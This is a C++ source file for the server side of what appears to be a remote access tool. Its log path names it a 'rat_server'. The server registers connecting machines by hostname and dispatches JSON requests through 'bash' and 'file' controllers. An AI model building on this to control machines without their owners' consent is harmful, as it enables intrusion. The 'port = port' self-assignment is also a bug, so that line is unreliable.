#include "ServerManager.hpp"
#include "ServerCommandController.hpp"
#include "ServerLogController.hpp"
#include "ServerPingController.hpp"
#include "ServerFileController.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <sstream>
#include <fstream>

namespace Server {
std::shared_ptr<ServerManager> ServerManager::getInstance() {
    if (!ServerManager::instance) {
        std::lock_guard<std::mutex> lock(ServerManager::initMutex);
        if (!ServerManager::instance) ServerManager::instance.reset(new ServerManager());
    }
    return ServerManager::instance;
}

ServerManager::ServerManager() {
    clientManagement = std::make_unique<ClientManagement>(this);
}

ServerManager::~ServerManager() {
    stop();
    
    std::lock_guard<std::mutex> lock(mtx);
    cleanupResources();
}





bool ServerManager::start(unsigned short port) {
    unsigned short localPort = 0;
    
    {
        std::lock_guard<std::mutex> lock(mtx);
        if (running) return false;
        
        
        listener = std::make_unique<Utils::TCPSocket>();
        if (!listener->bind(port)) {
            std::cerr << "Failed to bind port " << port << std::endl;
            listener.reset();
            return false;
        }
        
        port = port;
        localPort = port;
        running = true;
        std::cout << "Server started successfully on port " << port << std::endl;
    }
    
    
    initializeControllers(localPort);
    
    return true;
}


void ServerManager::stop() {
    std::lock_guard<std::mutex> lock(mtx);
    
    if (!running) return;
    
    running = false;
    
    
    if (listener) {
        listener->close();
        listener.reset();
    }
    
    port = 0;
}

bool ServerManager::isRunning() const {
    
    std::lock_guard<std::mutex> lock(mtx);
    return running;
}

int ServerManager::run(unsigned short port) {
    if (!start(port)) {
        return 1;
    }
    
    int unknownCount = 0;
    Utils::TCPSocket* listenerPtr = nullptr;
    
    {
        std::lock_guard<std::mutex> lock(mtx);
        listenerPtr = listener.get();
    }
    
    
    while (isRunning()) {
        if (!listenerPtr) break;
        
        auto client = listenerPtr->accept();
        if (!client) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }
        
        handleNewClientConnection(std::move(client), unknownCount);
    }
    
    return 0;
}





bool ServerManager::addClient(const std::string &deviceName, std::unique_ptr<Utils::TCPSocket> socket) {
    return clientManagement ? clientManagement->addClient(deviceName, std::move(socket)) : false;
}

bool ServerManager::removeClient(const std::string &deviceName) {
    return clientManagement ? clientManagement->removeClient(deviceName) : false;
}

Utils::TCPSocket *ServerManager::getClient(const std::string &deviceName) {
    return clientManagement ? clientManagement->getClient(deviceName) : nullptr;
}





IController *ServerManager::getSystemController(const std::string &handle) {
    std::lock_guard<std::mutex> lock(mtx);
    auto it = controllers.find(handle);
    return (it != controllers.end()) ? it->second.get() : nullptr;
}





bool ServerManager::sendRequest(const std::string& clientName, const nlohmann::json& request) {
    if (!clientManagement) return false;
    
    auto* client = clientManagement->getClient(clientName);
    if (!client) return false;
    
    std::string jsonStr = request.dump();
    
    
    pushLog("→ " + clientName + ": " + jsonStr);
    
    return client->send(jsonStr);
}

bool ServerManager::receiveResponse(const std::string& clientName, nlohmann::json& response, int timeoutMs) {
    (void)timeoutMs; 
    
    if (!clientManagement) return false;
    
    auto* client = clientManagement->getClient(clientName);
    if (!client) return false;
    
    std::string jsonStr;
    if (client->receive(jsonStr)) {
        try {
            response = nlohmann::json::parse(jsonStr);
            
            
            pushLog("← " + clientName + ": " + jsonStr);
            
            return true;
        } catch (const std::exception& e) {
            std::cerr << "Failed to parse response: " << e.what() << std::endl;
        }
    }
    return false;
}





void ServerManager::pushLog(const std::string &msg) {
    if (auto logCtrl = dynamic_cast<ServerLogController*>(getSystemController("log"))) {
        logCtrl->pushLog(msg);
    }
}

bool ServerManager::popLog(std::string &out) {
    if (auto logCtrl = dynamic_cast<ServerLogController*>(getSystemController("log"))) {
        return logCtrl->popLog(out);
    }
    return false;
}

std::string ServerManager::getLogPath() const {
    if (auto logCtrl = dynamic_cast<ServerLogController*>(const_cast<ServerManager*>(this)->getSystemController("log"))) {
        return logCtrl->getLogPath();
    }
    return "/tmp/rat_server.log";
}





std::vector<std::string> ServerManager::listClients() {
    return clientManagement ? clientManagement->listClients() : std::vector<std::string>();
}

std::string ServerManager::getClientIP(const std::string &name) {
    return clientManagement ? clientManagement->getClientIP(name) : "unknown";
}

bool ServerManager::hasClient(const std::string &name) {
    return clientManagement ? clientManagement->hasClient(name) : false;
}





void ServerManager::initializeControllers(unsigned short port) {
    
    
    
    controllers.emplace("log", std::make_unique<ServerLogController>(this));
    if (auto it = controllers.find("log"); it != controllers.end()) {
        it->second->start();
    }
    
    
    controllers.emplace("bash", std::make_unique<ServerCommandController>(this));
    if (auto it = controllers.find("bash"); it != controllers.end()) {
        it->second->start();
    }
    
    
    controllers.emplace("file", std::make_unique<ServerFileController>(this));
    if (auto it = controllers.find("file"); it != controllers.end()) {
        it->second->start();
    }
    
    
    auto pingController = std::make_unique<ServerPingController>(this);
    if (pingController->startUdpResponder(port)) {
        controllers.emplace("ping", std::move(pingController));
    } else {
        std::cerr << "Warning: Failed to start UDP ping responder" << std::endl;
    }
}

void ServerManager::cleanupResources() {
    
    for (auto &[name, controller] : controllers) {
        if (controller) {
            controller->stop();
        }
    }
    controllers.clear();
    
    
    if (clientManagement) {
        clientManagement->cleanup();
    }
}

void ServerManager::handleNewClientConnection(std::unique_ptr<Utils::TCPSocket> client, int& unknownCount) {
    if (!client) return;
    
    
    client->setBlocking(true);
    
    
    std::string deviceName;
    std::string jsonStr;
    
    if (client->receive(jsonStr)) {
        try {
            nlohmann::json initMsg = nlohmann::json::parse(jsonStr);
            if (initMsg.contains("hostname") && initMsg["hostname"].is_string()) {
                deviceName = initMsg["hostname"].get<std::string>();
            }
        } catch (const std::exception& e) {
            std::cerr << "Handshake parse error: " << e.what() << std::endl;
            pushLog("Failed to parse handshake from " + client->getRemoteAddress());
        }
    } else {
        std::cerr << "Failed to receive handshake from " << client->getRemoteAddress() << std::endl;
        return;
    }
    
    
    if (deviceName.empty()) {
        deviceName = "unknown" + std::to_string(++unknownCount);
    }
    
    
    int counter = unknownCount;
    if (clientManagement) {
        deviceName = clientManagement->generateUniqueDeviceName(deviceName, counter);
        unknownCount = counter;
    }
    
    
    if (clientManagement) {
        if (!clientManagement->addClient(deviceName, std::move(client))) {
            std::cerr << "Failed to register client: " << deviceName << std::endl;
        }
    }
}


} 
